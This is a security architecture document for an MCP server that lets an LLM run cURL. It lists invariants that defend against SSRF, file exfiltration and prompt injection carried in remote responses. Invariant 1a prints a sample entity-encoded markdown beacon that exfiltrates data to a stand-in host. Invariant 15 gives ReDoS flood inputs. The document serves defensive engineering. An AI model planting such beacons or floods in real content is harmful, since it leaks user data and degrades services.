# Architecture

**What this document owns: the numbered invariants a change must not break, and
the trust boundaries they defend.** Cite them by number in a review finding or an
RC rather than re-describing them.

**It does not own the descriptive detail.** The stack, directory structure,
request lifecycle, data stores, external integrations and the full security
architecture live in [`docs/architecture/architecture.md`](./docs/architecture/architecture.md),
which is the detailed reference and is **published to npm** (`package.json` →
`files` names it explicitly; this root file is not published). Restating any of it
here would put the same fact in two places, and the two would be corrected
separately — which is exactly what happened the first time this document existed.

Also not here: how to work in this repo (`CLAUDE.md`), what the work must look
like (`CONVENTIONS.md`), or what went wrong and what it taught us
(`LESSONS.md`).

## Two rules for maintaining this file

**Cite a file and a symbol or section by name.** `CONVENTIONS.md` → *Referring to
code and to files* owns this rule and states its scope: it binds **every** durable
output, not this document alone.

**Document the why.** What the code does is readable from the code. Why it is
shaped this way, what breaks if it changes, and which choice will look like a
mistake to someone who does not know the constraint — that is the part nobody can
reconstruct.

---

## The shape of the problem

An MCP server that lets an LLM execute cURL requests, plus the embeddable
TypeScript library behind it. Everything about the design follows from one fact:
**both ends are hostile.** The model chooses the URL, so the outbound side is an
SSRF surface. The remote chooses the response bytes, so the inbound side is a
prompt-injection surface. The security modules are not a layer bolted on top —
they are why the module boundaries fall where they do.

## Trust boundaries

Three, each with one place where crossing is made safe. The mechanisms are
detailed in `docs/architecture/architecture.md` → *Security Architecture*; what
follows is only the boundary map.

1. **Outbound — the model chooses the destination.** SSRF validation, DNS
   resolved before validation with cURL pinned to the resolved IP, scheme
   allowlist enforced at parse time, rate limits, argument-shaping defences
   against local-file exfiltration.
2. **Inbound — the remote chooses the response bytes, and they reach an LLM.**
   Every tool result passes the defence-in-depth wrap in
   `src/lib/response/post-processor.ts`; every piece of remote-origin *text*
   passes `src/lib/response/processor.ts::defendText`. These are different
   things and both are required — see invariants 1 and 1a.
3. **Filesystem — `jq_query` reads local files.** Scope-restricted, with
   symlinks resolved before the scope check.

## Invariants

The properties a change must not break. Each is falsifiable: if you cannot say
what a violation looks like, it does not belong on this list.

1. **Every byte returned to the LLM passes through the post-processor wrap.** Any
   new code path producing a `CallToolResult` — tool, hook short-circuit, custom
   tool, YAML endpoint, error path — goes through it. A path that bypasses it is
   a vulnerability regardless of how trusted its source looks.

1a. **Every piece of remote-origin text takes the FULL defence pipeline —
   `processor.ts::defendText` — not a subset of it.** Sanitise-and-detect alone
   is not sufficient and never was: it is Step 2 of five, and the markup,
   markdown-beacon and numeric-entity-decode stages are what remove exfiltration
   beacons and `<script>` blocks. This invariant exists because invariant 1 was
   satisfied *by a bug*: header text was split out of the body, routed through
   `sanitizeAndDetect`, and thereby lost Steps 3–5 while still satisfying "goes
   through sanitisation". An invariant that a defect can satisfy is not an
   invariant. **New text channels call `defendText`; they do not assemble their
   own pipeline**. Two channels narrow it with `decodeEntities: false` — the
   header channel and cURL stderr — because the decode stage's output is
   *returned*, so on a channel whose consumer does not decode it would
   manufacture live markup from inert bytes (`LESSONS.md` RC-3).

   **What that narrowing costs, stated correctly:** an entity-encoded beacon or
   `<script>` block on those two channels **survives the strip**, not merely the
   detection log. `![x](&#104;ttps://evil.test/?d=…)` is returned intact and a
   renderer that decodes entity references will fetch it. An earlier revision of
   this invariant described the cost as "Step 5 cannot unmask an entity-encoded
   injection phrase", which understated it to a logging blindness. `LESSONS.md`
   RC-12 records why the obvious fix — decode into a scratch copy — does not
   resolve it, and `docs/todos/004` carries the open design question.

   **The grammar a channel declares is where the real coverage question lives.**
   `defendText` on a JSON document runs sanitise-and-detect and no strip stage.
   So "calls `defendText`" is a weaker statement than it sounds, and reading it
   as "is fully stripped" is the same mistake this invariant was written about.
   What the shared call buys is that the exclusion is one decision in one place,
   reviewable, rather than a subset each caller assembled.

   **That exclusion is scoped to what gets persisted, and only to that.** It
   exists because `processResponse` writes post-strip content to disk and
   `jq_query` reads it back, so rewriting `<script>` or `[a](b)` inside a JSON
   string value there would silently alter a document the origin sent. The
   post-processor wrap has no disk artefact — a `registerCustomTool()` return
   goes straight to the model — so it passes `excludeJsonDocuments: false` and a
   beacon inside a JSON string value IS stripped before the model sees it.
   Persisted keeps the exemption; returned does not. `LESSONS.md` RC-10.

   **Above `STRIP_PATH_MAX_BYTES` (256 KB) every channel is Step 2 only.** The
   cap is a cost circuit-breaker and it is not a defence; on the custom-tool
   channel, where the wrap is the *only* defence, a handler returning more than
   256 KB of remote markdown gets sanitise-and-detect alone. That is a stated
   cost, not an oversight, and it is the reason the strip patterns must stay
   linear rather than merely capped — see invariant 15.


2. **DNS resolution precedes SSRF validation, and cURL is pinned to the validated
   IP.** Any change that lets cURL resolve a name itself reopens DNS rebinding.
3. **The scheme allowlist is enforced at parse time, not at use time.** A URL that
   is not `http`/`https` never becomes a `URL` object this code acts on.
4. **`spawn()` is called without a shell, and the command allowlist permits only
   `curl`.** Enforced at compile time and again at runtime.
5. **Request bodies use `--data-raw` / `--form-string`, never `--data` /
   `--form`.** The distinction is the local-file-exfiltration defence, and the
   safe forms look like gratuitous verbosity to anyone who does not know that.
6. **Detection runs on the original text; sanitisation runs after.** Reversing
   them makes the detector blind to exactly what it exists to catch.
7. **Sanitisation never suppresses content.** It rewrites; it does not drop a
   response or fail a request.
8. **`jq_query` resolves symlinks before checking scope**, never after.
9. **The wrap's idempotence tag is module-private and not `Symbol.for`.** A
   registered symbol would be forgeable.
10. **The layering arrow points one way:** `config/` (pure predicates) →
    `security/` (stateful) → `tools/` (composition). No import runs back up it.
    `CONVENTIONS.md` → *The layering arrow* states it as a citable rule.
11. **The four npm entry points are public contracts.** A breaking change to any
    exported type or behaviour is a MAJOR bump, and `createWrapper` stays
    unexported.
12. **Localhost is denied unless explicitly enabled**, and even then the reserved
    port range stays closed.
13. **A boundary between remote-controlled regions is never inferred from the
    bytes themselves.** Where two regions share a channel, the split point comes
    from a source the remote cannot write to — the per-request metadata separator
    (`generateMetadataSeparator`) or a cURL-authored `-w` field such as
    `%{size_header}`. A pattern match cannot do this job: a body may legitimately
    *be* an HTTP transcript, so a real header block and a forged one are the same
    bytes. When the boundary cannot be determined, fail closed and claim nothing —
    "undetermined" and "absent" must resolve the same way, never the permissive
    way.
14. **Anything surfaced inline to the model is bounded by an explicit limit.**
    `max_result_size` bounds the body; header text is capped at
    `min(LIMITS.MAX_HEADER_TEXT_BYTES, max_result_size)` — its own ceiling AND
    the caller's inline budget, because it is returned inline even when the body
    was saved to a file. A value added to the result after the size gate has run
    is unbounded in practice, whatever the gate reports.

    **The gate weighs the DEFENDED bytes, because the defence can add them.**
    `[link removed]` is 14 bytes and the shortest form it replaces is 9, so a
    body measured raw can pass a cap it then exceeds on the way to the model —
    `"[a](file:)".repeat(100)` returned 1400 bytes under a 1000-byte cap. The
    predicate is `processor.ts::exceedsInlineCap` and both size gates call it;
    a gate that measures its input rather than its output is the violation.

    **The gate belongs where the body is still a discrete string, not at the
    wrap.** By the wrap the body is sealed inside `formatResponse`'s JSON
    envelope: there is no body left to bound, a byte-truncation would cut the
    envelope mid-JSON, and the wrap has no file to save to. Measured: a
    *compliant* 1000-byte body reaches the wrap as a 1057-byte text part under
    `include_metadata`, so a wrap-side cap truncates correct responses. What the
    wrap gets instead is a guarantee from upstream. `LESSONS.md` RC-15.

15. **Every regex in the strip path is linear in the size of its input, and the
    byte cap is not what makes it so.** A `g`-flagged replace starts a match
    attempt at every position, so a pattern that is linear *per attempt* is
    quadratic *per pass*. `STRIP_PATH_MAX_BYTES` bounds the input, never the
    cost: at 256 KB the pre-fix markdown patterns took 82 seconds and the block
    patterns 4.5, synchronously, on the thread serving every session. A
    violation looks like a failing match attempt that can scan an unbounded
    distance forward — so the test is whether the character classes and anchors
    make a failure O(1), not whether a cap exists.

    **Enforced in two places that only work together.** `strip-blocks.ts`'s
    `withinClosableRegion` runs each pass over only the prefix ending at that
    pattern's own closing token, so within it every attempt has a closer
    ahead. **Keying that bound on the wrong token is how this has failed
    twice** — a bare `>` does not bound a pattern whose closer is `</script>`,
    and excluding `[` from a markdown label does not bound a URL class that
    ends at `)`. Both shipped past a review and a flood test; measurement
    caught them at 1.1 s and 2.9 s for a 256 KB body. Name the token the
    pattern must consume, and bound on that one.

    **The region bound is necessary and not sufficient, and that is the third
    failure.** A closer ahead is not a closer the attempt can REACH: with the
    opener written `<script\b[^>]*>`, an attribute run crossing `<` consumed
    the region's only closer as its own terminator, and every one of
    `"<script".repeat(30000) + "</script>"`'s openers then scanned to
    end-of-input for a second closer — 2881 ms, inside a correctly-computed
    bound. **The character classes carry what the region cannot.** Every class
    on either side of a match must exclude the first character of the token
    the match has to reach, which is why the tag opener, the tag closer and
    `lastTagCloserEnd`'s walk are all `[^<>]*` and the markdown URL class is
    `[^)\n]+`. Change one and argue it against both mechanisms.

    **A removal can splice a new token out of its neighbours**, so a strip that
    deletes is not finished when its pattern stops matching. Iterating a
    `replace` does not close this: each pass exposes exactly one layer, so a
    capped fixed point only moves the surviving depth to the cap, and the
    attacker picks the depth. Both strips here therefore SCAN, testing the
    OUTPUT tail after every character — convergence by construction, no
    iteration. This was reported by CodeQL on two consecutive review rounds and
    declined both times on the strength of the loop; the cap was the defect.

    **A flood test is a guard only if it omits the token the pattern needs.**
    Two generations of guard here fed inputs the then-current bound already
    handled, so both passed while the defect was live. `REDOS_BUDGET_MS` in
    `strip-blocks.test.ts` carries the calibration, and why a 2 s budget was
    worthless against a 1.1 s regression. `LESSONS.md` RC-11.

## Environments

Local, CI and the consumer runtime are described in
`docs/architecture/architecture.md` → *Development Workflow*. The one difference
that matters and is hardest to reproduce: **the available `curl` build.** Its
protocol support and its `-w` field set vary by version, and a check that passes
here may not hold on a consumer's machine. Anything depending on a specific cURL
feature must degrade legibly rather than assume — invariant 13's `%{size_header}`
dependency fails closed for exactly this reason.
